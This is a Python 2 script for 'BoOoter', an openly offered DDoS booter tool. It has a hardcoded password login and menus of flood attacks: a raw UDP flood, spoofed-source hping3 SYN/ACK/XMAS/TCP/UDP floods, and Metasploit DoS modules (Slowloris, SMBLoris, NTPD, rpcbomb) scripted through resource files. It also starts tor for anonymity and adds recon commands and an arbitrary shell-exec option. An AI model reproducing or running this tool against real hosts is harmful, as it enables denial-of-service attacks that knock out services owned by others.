# coding: latin-1
#if you use this code give me credit @tuf_unkn0wn
#i do not give you permission to edit this script without my credit
#to ask questions or report a problem message me on instagram @tuf_unkn0wn
import sys
import getpass
#--------ADD OR EDIT USERS AND PASSWORDS-----------#

credential = {"root" : "password", "user1" : "1234"}

#--------ADD OR EDIT USERS AND PASSWORDS-----------#
success = False
for i in range(3):
    username = raw_input("Username: ")
    password = getpass.getpass("Password: ")
    if (credential.get(username) == password):
        success = True
        break
    else:
        print "\033[091mError:\033[0m Login Failed"
	sys.exit()
if not success:
    print "\n\033[091mError:\033[0m Login Failed"
    sys.exit()
from time import sleep
from threading import Thread, active_count
from scapy.all import *
from os  import *
import random
import string
import signal
import ssl	
import argparse
import os
import socket
import socks
import requests
import time
import random
#---------------------#
r = '\033[31m'
W = '\033[90m'
R = '\033[91m'
N = '\033[0m'
G = '\033[92m'
B = '\033[94m'
Y = '\033[93m'
LB = '\033[1;36m'
P = '\033[95m'
Bl = '\033[30m'
O = '\033[33m'
p = '\033[35m'
BD = '\033[1m'
#-------------------#
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
Gb = random._urandom(20000)
bytes = random._urandom(20000)
Kb = random._urandom(20000)
os.system("clear")
out = os.popen('curl "http://myexternalip.com/raw"').read()
print "Starting BoOoter...       [ \033[1m\033[90mWaiting... \033[0m]"
print '\033]2;BoOoter | {0} | {1} | @tuf_unkn0wn\a'.format(username, out)
os.system("service tor start")
os.system("service postgresql start")
print "Starting BoOoter...       [ \033[1m\033[32mREADY \033[0m]"
os.system("sleep 1")
os.system("clear")


def mainbanner():
	print """\033[33m
	 ▄▀▀▀▀▄   ▄▀▀▄ ▄▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄  ▄▀▀▀█▀▀▄ \033[90m
	█        █  █   ▄▀ █      █ █ █   ▐ █    █  ▐ \033[33m
	█    ▀▄▄ ▐  █▄▄▄█  █      █    ▀▄   ▐   █     \033[90m
	█     █ █   █   █  ▀▄    ▄▀ ▀▄   █     █      \033[33m
	▐▀▄▄▄▄▀ ▐  ▄▀  ▄▀    ▀▀▀▀    █▀▀▀    ▄▀       \033[90m
	▐         █   █              ▐      █         \033[33m
	          ▐   ▐                     ▐         \033[90m
 
\033[0m\n\n""".decode('utf-8')

def help():
	print """\033[33m
════════════════════════════════════════════════════
                 \033[0m\033[1mBoOoter Commands\033[33m
════════════════════════════════════════════════════\033[0m
!flood : Flood commands
\033[33m!recon : Recon commands
\033[0m!ip    : Show IP
\033[33m!uname : Uname info
\033[0m!exec  : Execute command
\033[33mclear  : Clear screen
\033[0mexit   : Exit
\033[33m
════════════════════════════════════════════════════
	\033[0m""".decode('utf-8')
def floodhelp():
	print """\033[33m
════════════════════════════════════════════════════
                 \033[0m\033[1mFlood Commands\033[33m
════════════════════════════════════════════════════\033[0m
udp     : UDP flood
\033[33mfastudp : Faster UDP flood
\033[0mtcp     : TCP flood
\033[33msyn     : SYN flood
\033[0mack     : ACK flood
\033[33mxmas    : XMAS flood
\033[0mslowl   : Slow Loris Attack
\033[33mnbss    : SMBLoris NBSS flood
\033[0mntpd    : NTPD flood
\033[33mrpc     : RPC flood
════════════════════════════════════════════════════
	\033[0m""".decode('utf-8')
def reconhelp():
	print """\033[33m
════════════════════════════════════════════════════
                 \033[0m\033[1mRecon Commands\033[33m
════════════════════════════════════════════════════\033[0m
ipgrab : Host to IP
\033[33mping   : Ping a host
\033[0mcheck  : Check if a host is online
\033[33mport   : Portscan
\033[0mgeoip  : IP location
\033[33m
════════════════════════════════════════════════════
	\033[0m""".decode('utf-8')


def fastudp():
	target = raw_input('\033[0mTarget: ')
	ip = socket.gethostbyname(target)
	port = input('\033[0mPort: ')
	os.system("service tor restart")
	print "\033[0mudp flood started | \033[32m{5}\033[0m | {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year, ip)
	os.system("sleep 2s")
	sent = 0						
	while True:
		sock.sendto(Gb, (ip,port))
		sock.sendto(bytes, (ip,port))
		sock.sendto(Kb, (ip,port))
		sent = sent + 1
		port = port + 1
		if port == 65534:
			port = 1
def udp():
	target = raw_input("Target: ")
	port = raw_input("Port: ")
	os.system("hping3 {0} -p {1} --flood -d 50000 --udp --rand-source".format(target, port))


def slowl():
	de = raw_input("Delay: ")
	tar = raw_input("Target: ")
	port = raw_input("Port: ")
	soc = raw_input("Sockets: ")
	os.system('echo "use auxiliary/dos/http/slowloris\n" > slowl.rc')
	os.system('echo "set delay {0}\n" >> slowl.rc'.format(de))
	os.system('echo "set RHOST {0}\n" >> slowl.rc'.format(tar))
	os.system('echo "set RPORT {0}\n" >> slowl.rc'.format(port))
	os.system('echo "set sockets {0}\n" >> slowl.rc'.format(soc))
	os.system('echo "run\n" >> slowl.rc')
	os.system('msfconsole -q -r slowl.rc')
	os.system('rm -rf slowl.rc')
def nbss():
	tar = raw_input("Target: ")
	port = raw_input("Port: ")
	os.system('echo "use auxiliary/dos/smb/smb_loris\n" > nbss.rc')
	os.system('echo "set rhost {0}\n" >> nbss.rc'.format(tar))
	os.system('echo "set rport {0}\n" >> nbss.rc'.format(port))
	os.system('echo "run\n" >> nbss.rc')
	os.system('msfconsole -q -r nbss.rc')
	os.system('rm -rf nbss.rc')
def port():
	target = raw_input("\033[0mTarget: ")
	os.system("nmap {0}".format(target))
def ping():
	target = raw_input("\033[0mTarget: ")
	os.system("ping {0}".format(target))
def ipgrab():
	target = raw_input("\033[0mTarget: ")
	ip = socket.gethostbyname(target)
	print ip
def tcp():
	target = raw_input("Target: ")
	port = raw_input("Port: ")
	os.system("hping3 {0} {1} --flood -d 50000 --rand-source".format(target, port))

def syn():
	target = raw_input("Target: ")
	port = raw_input("Port: ")
	os.system("hping3 -S --flood -d 50000 --rand-source -p {0} {1}".format(port,target))
def ack():
	target = raw_input("Target: ")
	port = raw_input("Port: ")
	os.system("hping3 -A --flood -d 50000 --rand-source -p {0} {1}".format(port,target))
def xmas():
	target = raw_input("Target: ")
	port = raw_input("Port: ")
	os.system("hping3 -X --flood -d 50000 --rand-source -p {0} {1}".format(port,target))


def check():
	target = raw_input("Target: ")
	request = requests.get(target)
	http = request.status_code
	if http == 200:
		print("Server: [\033[32monline\033[0m]")
	else:
		print("Server: [\033[31moffline\033[0m]")

def geoip():
	target = raw_input("Target: ")
	os.system("curl https://api.hackertarget.com/geoip/?q={0}".format(target))
	print "\n"
def myip():
	os.system('curl "http://myexternalip.com/raw"')
	print "\n"
def ntpd():
	de = raw_input("Spoofed Server: ")
	tar = raw_input("Target: ")
	bytes = raw_input("Bytes: ")
	thr = raw_input("Threads: ")
	time = raw_input("Timeout: ")
	os.system('echo "use auxiliary/dos/ntp/ntpd_reserved_dos\n" > ntpd.rc')
	os.system('echo "set LHOST {0}\n" >> ntpd.rc'.format(de))
	os.system('echo "set RHOSTS {0}\n" >> ntpd.rc'.format(tar))
	os.system('echo "set SNAPLEN {0}\n" >> ntpd.rc'.format(bytes))
	os.system('echo "set threads {0}\n" >> ntpd.rc'.format(thr))
	os.system('echo "set timeout {0}\n" >> ntpd.rc'.format(time))
	os.system('echo "run\n" >> ntpd.rc')
	os.system('msfconsole -q -r ntpd.rc')
	os.system('rm -rf ntpd.rc')
def rpc():
	bytes = raw_input("Bytes: ")
	batch = raw_input("Batchsize: ")
	tar = raw_input("Target: ")
	port = raw_input("Port: ")
	thr = raw_input("Threads: ")
	os.system('echo "use auxiliary/dos/rpc/rpcbomb\n" > rpc.rc')
	os.system('echo "set ALLOCSIZE {0}\n" >> rpc.rc'.format(bytes))
	os.system('echo "set BATCHSIZE {0}\n" >> rpc.rc'.format(batch))
	os.system('echo "set RHOSTS {0}\n" >> rpc.rc'.format(tar))
	os.system('echo "set RPORT {0}\n" >> rpc.rc'.format(port))
	os.system('echo "set THREADS {0}\n" >> rpc.rc'.format(thr))
	os.system('echo "run\n" >> rpc.rc')
	os.system('msfconsole -q -r rpc.rc')
	os.system('rm -rf rpc.rc')
def run():
	command = raw_input(">: ")
	os.system(command)

def main():
	found = False
	while not found:
	
		x = raw_input("\033[33m{0}\033[92m@\033[33mboOoter\033[0m: \033[0m".format(username))
		
		if x == "!help" :
			help()
		if x == "!flood":
			floodhelp()
		if x == "!recon":
			reconhelp()

		if x == "exit":
			print "Stopping BoOoter...       [ \033[1m\033[90mWaiting... \033[0m]"
			os.system("service tor stop")
			os.system("service postgresql stop")
			print "Stopping BoOoter...       [ \033[1m\033[31mOFF \033[0m]"
			os.system("sleep 1")
			os.system("clear")
			sys.exit()

		if x == "clear":
			os.system("clear")
			mainbanner()

		if x == "udp":
			udp()
		if x == "nbss":
			nbss()
		if x == "slowl":
			slowl()
		if x == "port":
			port()
		if x == "ping":
			ping()
		if x == "ipgrab":
			ipgrab()
		if x == "tcp":
			tcp()
		if x == "syn":
			syn()
		if x == "check":
			check()
		if x == "geoip":
			geoip()
		if x == "!ip":
			myip()
		if x == "!uname":
			os.system("uname --all")
		if x == "ntpd":
			ntpd()
		if x == "rpc":
			rpc()
		if x == "ack":
			ack()
		if x == "xmas":
			xmas()
		if x == "!exec":
			run()
		if x == "fastudp":
			fastudp()


	found = True

print Y+"started at {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
mainbanner()
print "		\033[33mWelcome \033[0m{0}\033[33m to boOoter \033[0mV 1.0\n\n".format(username)
main()